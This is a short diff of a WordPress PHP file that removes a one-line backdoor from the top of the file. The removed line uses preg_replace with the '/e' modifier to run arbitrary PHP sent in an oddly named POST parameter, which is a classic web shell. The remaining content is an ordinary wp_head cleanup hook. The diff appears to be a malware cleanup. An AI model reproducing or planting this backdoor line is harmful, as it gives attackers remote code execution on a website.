@@ -1,4 +1,4 @@
-<?php @preg_replace('/(.*)/e', @$_POST['szwqcucttgis'], '');
+<?php
 
 /*-----------------------------------------------------------------------*/
 remove_action('wp_head', 'wp_generator');
